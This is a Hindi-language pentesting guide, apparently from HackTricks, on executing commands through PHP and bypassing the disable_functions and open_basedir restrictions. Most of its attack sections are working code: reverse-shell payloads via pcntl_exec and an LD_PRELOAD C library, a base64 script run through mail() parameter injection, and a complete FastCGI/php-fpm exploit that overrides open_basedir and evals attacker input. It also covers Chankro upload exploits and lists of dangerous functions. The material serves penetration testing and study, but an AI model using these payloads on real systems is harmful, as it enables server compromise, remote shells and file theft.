# PHP - उपयोगी फ़ंक्शन और disable_functions/open_basedir बायपास

{{#include ../../../../banners/hacktricks-training.md}}

## PHP कमांड और कोड निष्पादन

### PHP कमांड निष्पादन

**नोट:** एक [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php वेबशेल **स्वचालित रूप से** निम्नलिखित फ़ंक्शन की जांच कर सकता है और बायपास कर सकता है यदि इनमें से कुछ अक्षम हों।

**exec** - कमांड के आउटपुट की अंतिम पंक्ति लौटाता है
```bash
echo exec("uname  -a");
```
**passthru** - कमांड्स का आउटपुट सीधे ब्राउज़र में पास करता है
```bash
echo passthru("uname -a");
```
**system** - कमांड का आउटपुट सीधे ब्राउज़र में पास करता है और अंतिम पंक्ति लौटाता है
```bash
echo system("uname -a");
```
**shell_exec** - कमांड का आउटपुट लौटाता है
```bash
echo shell_exec("uname -a");
```
\`\` (बैकटिक) - shell_exec() के समान
```bash
echo `uname -a`
```
**popen** - एक कमांड के प्रोसेस के लिए पढ़ने या लिखने की पाइप खोलता है
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc_open** - popen() के समान लेकिन अधिक नियंत्रण की डिग्री
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl_exec** - एक प्रोग्राम को निष्पादित करता है (डिफ़ॉल्ट रूप से आधुनिक और नॉन-मॉडर्न PHP में, इस फ़ंक्शन का उपयोग करने के लिए आपको `pcntl.so` मॉड्यूल लोड करने की आवश्यकता है)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb_send_mail** - यह फ़ंक्शन मेल भेजने के लिए उपयोग किया जाता है, लेकिन इसका दुरुपयोग करके `$options` पैरामीटर के अंदर मनमाने कमांड इंजेक्ट किए जा सकते हैं। इसका कारण यह है कि **php `mail` फ़ंक्शन** आमतौर पर सिस्टम के अंदर `sendmail` बाइनरी को कॉल करता है और यह आपको **अतिरिक्त विकल्प डालने** की अनुमति देता है। हालाँकि, आप निष्पादित कमांड का आउटपुट नहीं देख पाएंगे, इसलिए यह अनुशंसित है कि एक शेल स्क्रिप्ट बनाई जाए जो आउटपुट को एक फ़ाइल में लिखे, इसे मेल के माध्यम से निष्पादित करे, और आउटपुट प्रिंट करे:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - यह फ़ंक्शन PHP एक्सटेंशन को गतिशील रूप से लोड करने के लिए उपयोग किया जा सकता है। यह फ़ंक्शन हमेशा मौजूद नहीं होगा, इसलिए आपको इसे शोषण करने की कोशिश करने से पहले यह जांचना चाहिए कि यह उपलब्ध है या नहीं। [इस पृष्ठ को पढ़ें कि इस फ़ंक्शन का शोषण कैसे करें](disable_functions-bypass-dl-function.md)।

### PHP कोड निष्पादन

eval के अलावा PHP कोड निष्पादित करने के अन्य तरीके हैं: include/require का उपयोग स्थानीय फ़ाइल शामिल करने और दूरस्थ फ़ाइल शामिल करने की कमजोरियों के रूप में दूरस्थ कोड निष्पादन के लिए किया जा सकता है।
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable_functions & open_basedir

**Disabled functions** वह सेटिंग है जिसे PHP में `.ini` फ़ाइलों में कॉन्फ़िगर किया जा सकता है जो निर्दिष्ट **functions** के उपयोग को **निषेध** करती है। **Open basedir** वह सेटिंग है जो PHP को उस फ़ोल्डर का संकेत देती है जिसे वह एक्सेस कर सकता है।\
PHP सेटिंग को _/etc/php7/conf.d_ या समान पथ में कॉन्फ़िगर किया जाना चाहिए।

दोनों कॉन्फ़िगरेशन को **`phpinfo()`** के आउटपुट में देखा जा सकता है:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../images/image (493).png>)

## open_basedir Bypass

`open_basedir` उन फ़ोल्डरों को कॉन्फ़िगर करेगा जिन्हें PHP एक्सेस कर सकता है, आप **उन फ़ोल्डरों के बाहर** कोई फ़ाइल लिख/read/execute नहीं कर पाएंगे, लेकिन आप **अन्य निर्देशिकाओं को सूचीबद्ध** भी नहीं कर पाएंगे।\
हालांकि, यदि किसी तरह आप मनमाना PHP कोड निष्पादित करने में सक्षम हैं, तो आप **निषेध** को **बायपास** करने के लिए निम्नलिखित **कोड** के टुकड़े को **कोशिश** कर सकते हैं।

### Listing dirs with glob:// bypass

इस पहले उदाहरण में `glob://` प्रोटोकॉल के साथ कुछ पथ बायपास का उपयोग किया गया है:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Note1**: पथ में आप `/e??/*` का उपयोग `/etc/*` और किसी अन्य फ़ोल्डर को सूचीबद्ध करने के लिए भी कर सकते हैं।\
**Note2**: ऐसा लगता है कि कोड का एक भाग डुप्लिकेट है, लेकिन यह वास्तव में आवश्यक है!\
**Note3**: यह उदाहरण केवल फ़ोल्डरों को सूचीबद्ध करने के लिए उपयोगी है, फ़ाइलों को पढ़ने के लिए नहीं।

### पूर्ण open_basedir बायपास FastCGI का दुरुपयोग

यदि आप **PHP-FPM और FastCGI के बारे में अधिक जानना चाहते हैं** तो आप [इस पृष्ठ के पहले अनुभाग](disable_functions-bypass-php-fpm-fastcgi.md) को पढ़ सकते हैं।\
यदि **`php-fpm`** कॉन्फ़िगर किया गया है तो आप इसका दुरुपयोग करके **open_basedir** को पूरी तरह से बायपास कर सकते हैं:

![](<../../../../images/image (545).png>)

![](<../../../../images/image (577).png>)

ध्यान दें कि आपको सबसे पहले यह पता लगाना होगा कि **php-fpm का यूनिक्स सॉकेट कहाँ है**। यह आमतौर पर `/var/run` के तहत होता है, इसलिए आप **डायरेक्टरी को सूचीबद्ध करने और इसे खोजने के लिए पिछले कोड का उपयोग कर सकते हैं**।\
[यहाँ](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy) से कोड।
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
ये स्क्रिप्ट **php-fpm के unix socket** के साथ संवाद करेगी (जो आमतौर पर /var/run में स्थित होता है यदि fpm का उपयोग किया जाता है) ताकि मनमाना कोड निष्पादित किया जा सके। `open_basedir` सेटिंग्स को **PHP_VALUE** विशेषता द्वारा अधिलेखित किया जाएगा जो भेजी जाती है।\
ध्यान दें कि `eval` का उपयोग PHP कोड निष्पादित करने के लिए किया जाता है जो आप **cmd** पैरामीटर के अंदर भेजते हैं।\
इसके अलावा, **commented line 324** पर ध्यान दें, आप इसे अनकमेंट कर सकते हैं और **payload स्वचालित रूप से दिए गए URL से कनेक्ट होगा और वहां निहित PHP कोड को निष्पादित करेगा।**\
बस `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` पर जाएं ताकि `/etc/passwd` फ़ाइल की सामग्री प्राप्त की जा सके।

> [!WARNING]
> आप सोच रहे होंगे कि जिस तरह से हमने `open_basedir` कॉन्फ़िगरेशन को अधिलेखित किया है, हम **`disable_functions`** को भी **अधिलेखित** कर सकते हैं। खैर, इसे आजमाएं, लेकिन यह काम नहीं करेगा, स्पष्ट रूप से **`disable_functions` केवल एक `.ini` php** कॉन्फ़िगरेशन फ़ाइल में कॉन्फ़िगर किया जा सकता है और आप जो परिवर्तन PHP_VALUE का उपयोग करके करते हैं, वे इस विशेष सेटिंग पर प्रभावी नहीं होंगे।

## disable_functions Bypass

यदि आप किसी मशीन के अंदर PHP कोड निष्पादित करने में सफल होते हैं, तो आप शायद अगले स्तर पर जाना चाहेंगे और **मनमाने सिस्टम कमांड्स को निष्पादित करना** चाहेंगे। इस स्थिति में यह सामान्य है कि अधिकांश या सभी PHP **functions** जो **सिस्टम कमांड्स को निष्पादित करने की अनुमति देते हैं, **`disable_functions`** में **निष्क्रिय** कर दिए गए हैं।\
तो, चलिए देखते हैं कि आप इस प्रतिबंध को कैसे बायपास कर सकते हैं (यदि आप कर सकते हैं)

### Automatic bypass discovery

आप उपकरण [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) का उपयोग कर सकते हैं और यह आपको बताएगा कि कौन सी फ़ंक्शन (यदि कोई हो) आप **`disable_functions`** को **बायपास** करने के लिए उपयोग कर सकते हैं।

### Bypassing using other system functions

बस इस पृष्ठ के शुरुआत में लौटें और **जांचें कि क्या कोई भी कमांड निष्पादित करने वाली फ़ंक्शन निष्क्रिय और वातावरण में उपलब्ध नहीं है**। यदि आप उनमें से केवल 1 को पाते हैं, तो आप इसे मनमाने सिस्टम कमांड्स को निष्पादित करने के लिए उपयोग कर सकते हैं।

### LD_PRELOAD bypass

यह अच्छी तरह से ज्ञात है कि PHP में कुछ फ़ंक्शन जैसे `mail()` **सिस्टम के अंदर बाइनरीज़ को निष्पादित करने जा रहे हैं**। इसलिए, आप उन्हें `LD_PRELOAD` पर्यावरण चर का उपयोग करके दुरुपयोग कर सकते हैं ताकि वे किसी भी चीज़ को निष्पादित करने के लिए एक मनमानी लाइब्रेरी लोड करें।

#### Functions that can be used to bypass disable_functions with LD_PRELOAD

- **`mail`**
- **`mb_send_mail`**: प्रभावी जब `php-mbstring` मॉड्यूल स्थापित होता है।
- **`imap_mail`**: काम करता है यदि `php-imap` मॉड्यूल मौजूद है।
- **`libvirt_connect`**: `php-libvirt-php` मॉड्यूल की आवश्यकता होती है।
- **`gnupg_init`**: `php-gnupg` मॉड्यूल स्थापित होने पर उपयोगी।
- **`new imagick()`**: इस क्लास का दुरुपयोग प्रतिबंधों को बायपास करने के लिए किया जा सकता है। विस्तृत शोषण तकनीकें एक व्यापक [**writeup here**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/) में पाई जा सकती हैं।

आप [**यहां खोज सकते हैं**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) वह फज़िंग स्क्रिप्ट जो उन फ़ंक्शंस को खोजने के लिए उपयोग की गई थी।

यहां एक लाइब्रेरी है जिसे आप `LD_PRELOAD` env चर का दुरुपयोग करने के लिए संकलित कर सकते हैं:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Chankro का उपयोग करके बायपास

इस गलत कॉन्फ़िगरेशन का दुरुपयोग करने के लिए आप [**Chankro**](https://github.com/TarlogicSecurity/Chankro) का उपयोग कर सकते हैं। यह एक उपकरण है जो **PHP एक्सप्लॉइट** उत्पन्न करेगा जिसे आपको कमजोर सर्वर पर अपलोड करना है और इसे निष्पादित करना है (वेब के माध्यम से एक्सेस करें)।\
**Chankro** पीड़ित के डिस्क में **लाइब्रेरी और रिवर्स शेल** लिखेगा जिसे आप निष्पादित करना चाहते हैं और **`LD_PRELOAD` ट्रिक + PHP `mail()`** फ़ंक्शन का उपयोग करके रिवर्स शेल को निष्पादित करेगा।

ध्यान दें कि **Chankro** का उपयोग करने के लिए, `mail` और `putenv` **`disable_functions` सूची में नहीं होना चाहिए**।\
निम्नलिखित उदाहरण में आप देख सकते हैं कि **arch 64** के लिए **chankro एक्सप्लॉइट** कैसे बनाया जाता है, जो `whoami` को निष्पादित करेगा और आउटपुट को _/tmp/chankro_shell.out_ में सहेजेगा, chankro **लाइब्रेरी और पेलोड** को _/tmp_ में लिखेगा और **अंतिम एक्सप्लॉइट** को **bicho.php** कहा जाएगा (यह वह फ़ाइल है जिसे आपको पीड़ित के सर्वर पर अपलोड करना है):

{{#tabs}}
{{#tab name="shell.sh"}}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{{#endtab}}

{{#tab name="Chankro"}}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{{#endtab}}
{{#endtabs}}

यदि आप पाते हैं कि **mail** फ़ंक्शन अक्षम फ़ंक्शनों द्वारा अवरुद्ध है, तो आप अभी भी **mb_send_mail** फ़ंक्शन का उपयोग कर सकते हैं।\
इस तकनीक और Chankro के बारे में अधिक जानकारी यहाँ: [https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

### "बायपास" PHP क्षमताओं का उपयोग करके

ध्यान दें कि **PHP** का उपयोग करके आप **फाइलें पढ़ और लिख सकते हैं, निर्देशिकाएँ बना सकते हैं और अनुमतियाँ बदल सकते हैं**।\
आप यहां तक कि **डेटाबेस डंप** भी कर सकते हैं।\
शायद **PHP** का उपयोग करके बॉक्स को **enumerate** करते समय आप विशेषाधिकार बढ़ाने/कमांड निष्पादित करने का एक तरीका खोज सकते हैं (उदाहरण के लिए कुछ निजी ssh कुंजी पढ़ना)।

मैंने एक वेबशेल बनाया है जो इन कार्यों को करना बहुत आसान बनाता है (ध्यान दें कि अधिकांश वेबशेल आपको ये विकल्प भी प्रदान करेंगे): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### मॉड्यूल/संस्करण निर्भर बायपास

यदि कुछ विशिष्ट मॉड्यूल का उपयोग किया जा रहा है या कुछ विशिष्ट PHP संस्करण का शोषण किया जा रहा है, तो disable_functions को बायपास करने के कई तरीके हैं:

- [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable_functions-bypass-php-fpm-fastcgi.md)
- [**FFI के साथ बायपास - विदेशी फ़ंक्शन इंटरफ़ेस सक्षम**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md)
- [**mem के माध्यम से बायपास**](disable_functions-bypass-via-mem.md)
- [**mod_cgi**](disable_functions-bypass-mod_cgi.md)
- [**PHP पर्ल एक्सटेंशन Safe_mode**](disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.md)
- [**dl फ़ंक्शन**](disable_functions-bypass-dl-function.md)
- [**यह शोषण**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
- 5.\* - PoC में छोटे परिवर्तनों के साथ शोषण योग्य
- 7.0 - अब तक के सभी संस्करण
- 7.1 - अब तक के सभी संस्करण
- 7.2 - अब तक के सभी संस्करण
- 7.3 - अब तक के सभी संस्करण
- 7.4 - अब तक के सभी संस्करण
- 8.0 - अब तक के सभी संस्करण
- [**7.0 से 8.0 शोषण (Unix केवल)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
- [**PHP 7.0=7.4 (\*nix)**](disable_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
- [**Imagick 3.3.0 PHP >= 5.4**](disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
- [**PHP 5.x Shellsock**](disable_functions-php-5.x-shellshock-exploit.md)
- [**PHP 5.2.4 ionCube**](disable_functions-php-5.2.4-ioncube-extension-exploit.md)
- [**PHP <= 5.2.9 Windows**](disable_functions-bypass-php-less-than-5.2.9-on-windows.md)
- [**PHP 5.2.4/5.2.5 cURL**](disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
- [**PHP 5.2.3 -Win32std**](disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
- [**PHP 5.2 FOpen शोषण**](disable_functions-bypass-php-5.2-fopen-exploit.md)
- [**PHP 4 >= 4.2.-, PHP 5 pcntl_exec**](disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md)

### **स्वचालित उपकरण**

निम्नलिखित स्क्रिप्ट यहाँ टिप्पणी की गई कुछ विधियों का प्रयास करती है:\
[https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php)

## अन्य दिलचस्प PHP फ़ंक्शन

### कॉलबैक स्वीकार करने वाले फ़ंक्शनों की सूची

ये फ़ंक्शन एक स्ट्रिंग पैरामीटर स्वीकार करते हैं जिसका उपयोग हमलावर की पसंद के फ़ंक्शन को कॉल करने के लिए किया जा सकता है। फ़ंक्शन के आधार पर, हमलावर के पास पैरामीटर पास करने की क्षमता हो सकती है या नहीं। उस मामले में, एक सूचना प्रकटीकरण फ़ंक्शन जैसे phpinfo() का उपयोग किया जा सकता है।

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[यहाँ से सूचियाँ](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### जानकारी का खुलासा

इनमें से अधिकांश फ़ंक्शन कॉल्स सिंक नहीं हैं। लेकिन यदि लौटाए गए डेटा में से कोई भी डेटा हमलावर के लिए दृश्य है, तो यह एक कमजोर बिंदु हो सकता है। यदि एक हमलावर phpinfo() देख सकता है, तो यह निश्चित रूप से एक कमजोर बिंदु है।
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### अन्य
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### फ़ाइल प्रणाली फ़ंक्शन

RATS के अनुसार, php में सभी फ़ाइल प्रणाली फ़ंक्शन खराब हैं। इनमें से कुछ हमलावर के लिए बहुत उपयोगी नहीं लगते। अन्य आपकी सोच से अधिक उपयोगी हैं। उदाहरण के लिए, यदि allow_url_fopen=On है, तो एक URL को फ़ाइल पथ के रूप में उपयोग किया जा सकता है, इसलिए copy($\_GET\['s'], $\_GET\['d']); का कॉल सिस्टम पर कहीं भी एक PHP स्क्रिप्ट अपलोड करने के लिए उपयोग किया जा सकता है। इसके अलावा, यदि एक साइट GET के माध्यम से भेजे गए अनुरोध के प्रति संवेदनशील है, तो उन सभी फ़ाइल प्रणाली फ़ंक्शनों का दुरुपयोग किया जा सकता है ताकि आपके सर्वर के माध्यम से एक हमले को दूसरे होस्ट पर चैनल किया जा सके।

**ओपन फ़ाइल प्रणाली हैंडलर**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**फाइल सिस्टम में लिखें (पढ़ने के साथ आंशिक रूप से संयोजन में)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
